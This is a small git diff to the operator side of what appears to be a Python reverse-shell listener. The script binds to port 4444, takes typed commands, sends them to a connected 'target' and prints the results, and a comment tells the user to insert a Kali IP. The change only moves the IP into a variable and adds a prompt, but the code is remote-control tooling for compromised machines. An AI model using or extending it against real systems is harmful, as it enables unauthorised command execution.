@@ -2,6 +2,7 @@ import socket
 import json
 import base64
 
+server_ip = '192.168.64.2'
 def listen_on(ip, port):
     global target
 
@@ -29,7 +30,7 @@ def receive():
 def server_run():
     print("Please type your command")
     while True:
-        cmd = input()
+        cmd = input(f"{server_ip}: ")
         if cmd == "exit":
             break
         if cmd:
@@ -39,5 +40,5 @@ def server_run():
         if rec:
             print(rec)
 
-listen_on('192.168.64.2', 4444) #Replace 10.0.2.15 with your Kali IP
+listen_on(server_ip, 4444) #Replace 10.0.2.15 with your Kali IP
 server_run()
